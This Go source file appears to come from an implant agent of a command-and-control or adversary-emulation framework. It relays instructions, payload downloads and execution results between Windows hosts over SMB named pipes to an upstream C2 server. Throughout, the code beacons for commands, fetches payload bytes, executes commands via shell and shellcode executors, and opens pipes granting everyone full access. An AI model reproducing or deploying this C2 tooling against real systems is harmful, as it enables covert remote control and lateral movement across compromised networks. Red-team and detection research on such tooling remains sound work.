// +build windows

package proxy

import (
    "bufio"
    "fmt"
    "net"
    "encoding/json"
    "time"
    "io"
    "math/rand"
    "errors"
    "strings"
    "path/filepath"
    "../winio"
    "../output"
    "../executors/execute"
    "../util"
    "../contact"
    _ "../executors/shellcode" // necessary to initialize all submodules
	_ "../executors/shells"    // necessary to initialize all submodules
)

const pipeLetters = "abcdefghijklmnopqrstuvwxyz"
const numPipeLetters = int64(len(pipeLetters))
const clientPipeNameMinLen = 10
const clientPipeNameMaxLen = 15
const maxChunkSize = 5*4096

//SmbPipeAPI communicates through SMB named pipes. Implements the Contact interface
type SmbPipeAPI struct { }

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver struct {
    UpstreamComs contact.Contact // Contact implementation to handle upstream communication.
    Listener net.Listener // Listener object for this receiver.
    Server string // Location of upstream server to send data to.
}

func init() {
	contact.CommunicationChannels["P2pSmbPipe"] = SmbPipeAPI{}
	P2pReceiverChannels["SmbPipe"] = &SmbPipeReceiver{}
}

// SmbPipeReceiver Implementation (implements Contact interface).

// Listen on agent's main pipe for client connection. This main pipe will only respond to client requests with
// a unique pipe name for the client to resend the request to.
func (receiver *SmbPipeReceiver) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs contact.Contact) {
    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]

    // Give the receiver the original server value.
    receiver.Server = profile["server"].(string)
    receiver.UpstreamComs = upstreamComs
    go receiver.startReceiverHelper(profile, pipePath)
}

// Helper method for StartReceiver. Must be run as a go routine.
func (receiver *SmbPipeReceiver) startReceiverHelper(profile map[string]interface{}, pipePath string) {
    listener, err := listenPipeFullAccess(pipePath)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe: %v", err))
        return
    }
    receiver.Listener = listener
    defer receiver.Listener.Close()
    output.VerbosePrint("[*] Listening on main handler pipe")

    // Whenever a new client connects to pipe with a request, generate a new individual pipe for that client, listen on that pipe,
    // and give the pipe name to the client.
    for {
        totalData, err := receiver.fetchPipeClientInput()
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe: %v", err))
            continue
        }

        // Handle request. This pipe should only receive GetInstruction beacons.
        // We won't forward instruction requests with this main pipe - just generate new individual pipe for client.
        // Client will resend the request to the original pipe.
        message := BytesToP2pMsg(totalData)
        if MsgIsEmpty(message) {
            output.VerbosePrint("[!] Error: received empty message from client.")
        } else if message.MessageType == GET_INSTRUCTIONS {
            output.VerbosePrint("[*] Main pipe received instruction request beacon. Will create unique pipe for client to resend request to.")
            receiver.setIndividualClientPipe(profile)
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] WARNING: expected get instruction request, received request type %d instead", message.MessageType))
        }
    }
}

// When client sends this receiver an individual pipe request, generate a new random pipe to listen on solely for this client.
// Also notify the client of this new pipe name.
func (receiver *SmbPipeReceiver) setIndividualClientPipe(profile map[string]interface{}) {
    // Create random pipe name
    rand.Seed(time.Now().UnixNano())
    clientPipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
    clientPipePath := "\\\\.\\pipe\\" + clientPipeName

    // Start individual receiver on client pipe and send name to client.
    individualReceiver := &SmbPipeReceiver{
        Server: receiver.Server,
        UpstreamComs: receiver.UpstreamComs,
    }
    go individualReceiver.startIndividualReceiver(profile, clientPipePath)

    // Create response message for client.
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    pipeMsgData := BuildP2pMsgBytes(paw, RESEND_REQUEST, []byte(clientPipeName), "")

    // Wait for client to reconnect before sending response.
    conn, err := receiver.Listener.Accept()
    defer conn.Close()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return
    }
    _, err = sendDataToPipeConn(conn, pipeMsgData)
    if err == nil {
        output.VerbosePrint("[*] Sent new individual client pipe.")
    } else {
        output.VerbosePrint(fmt.Sprintf("[!] Error sending individual client pipe name to client: %v", err))
    }
}

// Sets up listener on specified pipe for individual client. This pipe will handle all client requests.
func (receiver *SmbPipeReceiver) startIndividualReceiver(profile map[string]interface{}, pipePath string) {
    listener, err := listenPipeFullAccess(pipePath)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe: %v", err))
        return
    }
    receiver.Listener = listener
    defer receiver.Listener.Close()

    // Get data from client and process request.
	for {
        totalData, err := receiver.fetchPipeClientInput()
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe: %v", err))
            continue
        }
        receiver.listenerHandlePipePayload(BytesToP2pMsg(totalData), profile)
	}
}

// Helper function that handles data received from the named pipe by forwarding requests to the agent's c2/upstream server.
// Waits for original client to connect to listener before writing response back.
func (receiver *SmbPipeReceiver) listenerHandlePipePayload(message P2pMessage, profile map[string]interface{}) {
    if MsgIsEmpty(message) {
        output.VerbosePrint("[!] Error: received empty message from client.")
    } else {
        switch message.MessageType {
        case GET_INSTRUCTIONS:
            receiver.forwardGetInstructions(message, profile)
        case GET_PAYLOAD_BYTES:
            receiver.forwardPayloadBytesDownload(message, profile)
        case SEND_EXECUTION_RESULTS:
            receiver.forwardSendExecResults(message, profile)
        default:
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: received invalid instruction type for p2p listeners: %d", message.MessageType))
        }
    }
}

// Pass the instruction request to the upstream coms, and return the response.
func (receiver *SmbPipeReceiver) forwardGetInstructions(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw

    // message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = receiver.Server // make sure we send the instructions to the right place.

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := receiver.Listener.Accept()
    defer conn.Close()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return
    }

    // Get upstream response.
    response := receiver.UpstreamComs.GetInstructions(clientProfile)

    // Change this receiver's server if a new server was specified.
    if clientProfile["server"].(string) != receiver.Server {
        receiver.Server = clientProfile["server"].(string)
    }

    // Return response downstream.
    data, _ := json.Marshal(response)
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := BuildP2pMsgBytes(forwarderPaw, RESPONSE_INSTRUCTIONS, data, "")
    _, err = sendDataToPipeConn(conn, pipeMsgData)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error sending instruction response to paw %s: %v", paw, err))
    }
}

func (receiver *SmbPipeReceiver) forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := receiver.Listener.Accept()
    defer conn.Close()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return
    }
    _, payloadBytes := receiver.UpstreamComs.GetPayloadBytes(fileInfo["file"], receiver.Server, paw, fileInfo["platform"], false)

    // Return response downstream.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := BuildP2pMsgBytes(forwarderPaw, RESPONSE_PAYLOAD_BYTES, payloadBytes, "")
    _, err = sendDataToPipeConn(conn, pipeMsgData)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error sending payload bytes to paw %s: %v", paw, err))
    }
}

func (receiver *SmbPipeReceiver) forwardSendExecResults(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw

    // message payload contains client profile and result info.
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    if clientProfile == nil {
        output.VerbosePrint("[!] Error. Client sent blank message payload for execution results.")
        return
    }
    clientProfile["server"] = receiver.Server
    result := clientProfile["result"].(map[string]interface{})

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := receiver.Listener.Accept()
    defer conn.Close()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return
    }
    receiver.UpstreamComs.SendExecutionResults(clientProfile, result)

    // Send response message to client.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := BuildP2pMsgBytes(forwarderPaw, RESPONSE_SEND_EXECUTION_RESULTS, nil, "") // no data to send, just an ACK
    _, err = sendDataToPipeConn(conn, pipeMsgData)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error sending execution result delivery response to paw %s: %v", paw, err))
    }
}

// Helper function that waits for client to connect to the listener and returns data sent by client.
func (receiver *SmbPipeReceiver) fetchPipeClientInput() ([]byte, error) {
    if receiver.Listener == nil {
        return nil, errors.New("listener object not set for receiver.")
    }
    conn, err := receiver.Listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return nil, err
    }

    // Read in the data and close connection.
    pipeReader := bufio.NewReader(conn)
    data, err := readPipeData(pipeReader)
    return data, err
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient SmbPipeAPI) GetInstructions(profile map[string]interface{}) map[string]interface{} {
    // Send beacon and fetch response
    payload, _ := json.Marshal(profile)
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), paw, GET_INSTRUCTIONS, payload)

	var out map[string]interface{}
	if err == nil {
		// Check if server wants us to switch pipes.
		for serverResp.MessageType == RESEND_REQUEST {
            // We got the pipe name to resend request to.
            newPipeName := string(serverResp.Payload)
            output.VerbosePrint("[*] Obtained individual pipe name to resend request to")

            // Replace server for agent.
            serverHostName := strings.Split(profile["server"].(string), "\\")[2]
            newServerPipePath := "\\\\" + serverHostName + "\\pipe\\" + newPipeName
            profile["server"] = newServerPipePath
            serverResp, err = p2pPipeClient.sendRequestToServer(newServerPipePath, paw, GET_INSTRUCTIONS, payload)
            if err != nil {
                output.VerbosePrint(fmt.Sprintf("[-] P2p resent beacon DEAD. Error: %v", err))
                break
            }
        }

        // Check if blank message was returned.
        if MsgIsEmpty(serverResp) {
		    output.VerbosePrint("[-] Empty message from server. P2p beacon DEAD")
        } else if serverResp.MessageType != RESPONSE_INSTRUCTIONS {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", serverResp.MessageType))
        } else {
            // Message payload contains instruction info.
            json.Unmarshal(serverResp.Payload, &out)
            if out != nil {
                out["sleep"] = int(out["sleep"].(float64))
                out["watchdog"] = int(out["watchdog"].(float64))
                output.VerbosePrint("[*] P2p beacon ALIVE")
            } else {
		        output.VerbosePrint("[-] Empty payload from server. P2p beacon DEAD.")
            }
		}
	} else {
	    output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
		output.VerbosePrint("[-] P2p beacon DEAD")
	}
	return out
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient SmbPipeAPI) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
	var retBuf []byte
	location := ""
	if len(payload) > 0 {
	    // Download single payload bytes. Create SMB Pipe message with instruction type GET_PAYLOAD_BYTES
	    // and payload as a map[string]string specifying the file and platform.
		output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload bytes: %s", payload))
        fileInfo := map[string]interface{} {"file": payload, "platform": platform}
        msgPayload, _ := json.Marshal(fileInfo)
		responseMsg, err := p2pPipeClient.sendRequestToServer(server, uniqueID, GET_PAYLOAD_BYTES, msgPayload)

		if err == nil {
            if responseMsg.MessageType == RESPONSE_PAYLOAD_BYTES {
                // Payload bytes in message payload.
                payloadBytes := responseMsg.Payload

                if writeToDisk {
                    // Write payload to disk.
                    location = filepath.Join(payload)
                    util.WritePayloadBytes(location, payloadBytes)
                } else {
                    // Don't write payload to disk.
                    retBuf = payloadBytes
                }
            } else {
                output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting getting payload bytes: %d", responseMsg.MessageType))
            }
		} else {
		    output.VerbosePrint("[!] Error: failed message response from forwarder.")
		}
	}
	return location, retBuf
}

func (p2pPipeClient SmbPipeAPI) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
    result := make(map[string]interface{})
    output, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
 	p2pPipeClient.SendExecutionResults(profile, result)
}

func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(criteria map[string]string) bool {
    return true
}

func (p2pPipeClient SmbPipeAPI) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
    // Build SMB pipe message for sending execution results.
    // payload will JSON marshal of profile, with execution results
    profileCopy := profile
	profileCopy["result"] = result
	payload, _ := json.Marshal(profileCopy)
    output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to send execution results to %s", profile["server"].(string)))
    serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), profile["paw"].(string), SEND_EXECUTION_RESULTS, payload)

    if err == nil {
        if serverResp.MessageType == RESPONSE_SEND_EXECUTION_RESULTS {
            output.VerbosePrint("[*] P2p Client: forwarder passed on our execution results.")
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for sending execution results: %d", serverResp.MessageType))
        }
    } else {
        output.VerbosePrint("[!] Error: failed sending execution result response from forwarder.")
    }
}


/*
 * Other auxiliary functions
 */

// Send a P2pMessage to the server using the specified server pipe path, paw, message type, and payload.
// Returns the P2pMessage from the server.
func (p2pPipeClient SmbPipeAPI) sendRequestToServer(pipePath string, paw string, messageType int, payload []byte) (P2pMessage, error) {
    // Build P2pMessage and convert to bytes.
    pipeMsgData := BuildP2pMsgBytes(paw, messageType, payload, "")

    // Send request and fetch response
    p2pPipeClient.sendSmbPipeClientInput(pipePath, pipeMsgData)
    responseData, err := p2pPipeClient.fetchReceiverResponse(pipePath)

    if responseData != nil && err == nil {
        respMsg := BytesToP2pMsg(responseData)
        return respMsg, nil
    } else {
        return P2pMessage{}, err
    }
}

// Sends data to specified pipe.
func (p2pPipeClient SmbPipeAPI) sendSmbPipeClientInput(pipePath string, data []byte) {
    conn, err := winio.DialPipe(pipePath, nil)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
        if err == winio.ErrTimeout {
            output.VerbosePrint("[!] Timed out trying to dial to pipe")
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe: %v", err))
        }
        return
    }
    defer conn.Close()

    // Write data and close connection.
    _, err = sendDataToPipeConn(conn, data)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error sending data to pipe connection: %v", err))
    }
}

// Read response data from receiver using given pipePath. Return data read and any errors.
func (p2pPipeClient SmbPipeAPI) fetchReceiverResponse(pipePath string) ([]byte, error) {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        if err == winio.ErrTimeout {
            output.VerbosePrint("[!] Timed out trying to dial to pipe")
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe: %v", err))
        }
        return nil, err
    }

    defer conn.Close()

    // Read data and return.
    pipeReader := bufio.NewReader(conn)
    data, err := readPipeData(pipeReader)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error reading data from pipe: %v", err))
        return nil, err
    }
    return data, nil
}

// Helper function that listens on pipe and returns listener and any error.
func listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that creates random string of specified length using letters a-z
func getRandPipeName(length int) string {
    rand.Seed(time.Now().UnixNano())
    buffer := make([]byte, length)
    for i := range buffer {
        buffer[i] = pipeLetters[rand.Int63() % numPipeLetters]
    }
    return string(buffer)
}

// Sends data to specified pipe connection. Returns total number of bytes written and errors if any.
func sendDataToPipeConn(conn net.Conn, data []byte) (int, error) {
    // Write data chunks.
    writer := bufio.NewWriter(conn)
    endIndex := 0
    startIndex := 0
    dataSize := len(data)
    counter := 0
    for ; endIndex < dataSize; {
        endIndex = startIndex + maxChunkSize
        if dataSize <= endIndex {
            endIndex = dataSize
        }
        dataToSend := data[startIndex:endIndex]
        numWritten, err := writePipeData(dataToSend, writer)
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error sending data chunk: %v", err))
            return counter, err
        } else {
            counter = counter + numWritten
        }
        startIndex = endIndex
    }
    return counter, nil
}

// Returns data read, along with any non-EOF errors.
func readPipeData(pipeReader *bufio.Reader) ([]byte, error) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]

        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 return nil, err
            }
        }

        // Add data chunk to current total
        totalData = append(totalData, buffer...)
        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             return nil, err
        }
    }
    return totalData, nil
}

// Write data using the Writer object. Returns number of bytes written, and an error if any.
func writePipeData(data []byte, pipeWriter *bufio.Writer) (int, error) {
    if data == nil || len(data) == 0 {
        output.VerbosePrint("[!] Warning: attempted to write nil/empty data byte array to pipe.")
        return 0, nil
    }
    if pipeWriter == nil {
        return 0, errors.New("Nil writer object for sending data to pipe.")
    }

    numBytes, err := pipeWriter.Write(data)

    if err != nil {
        if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return numBytes, err
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error writing data to pipe\n%v", err))
            return numBytes, err
	    }
    }

    err = pipeWriter.Flush()
	if err != nil {
	    if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return numBytes, err
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error flushing data to pipe\n%v", err))
		    return numBytes, err
	    }
	}

	return numBytes, nil
}